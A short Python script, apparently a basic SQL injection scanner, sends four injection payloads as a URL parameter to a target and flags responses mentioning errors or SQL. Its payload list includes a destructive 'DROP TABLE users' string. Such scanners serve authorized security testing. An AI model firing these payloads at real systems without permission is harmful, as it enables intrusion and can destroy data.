import requests

payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    '" OR "" = "',
    "'; DROP TABLE users --"
]

def check_sqli(target):
    results = []

    for payload in payloads:
        try:
            r = requests.get(target, params={"id": payload}, timeout=5)

            if "error" in r.text.lower() or "sql" in r.text.lower():
                results.append(f"Possible SQLi detected with payload: {payload}")
        except:
            continue

    if not results:
        return ["No SQL Injection vulnerabilities detected."]

    return results
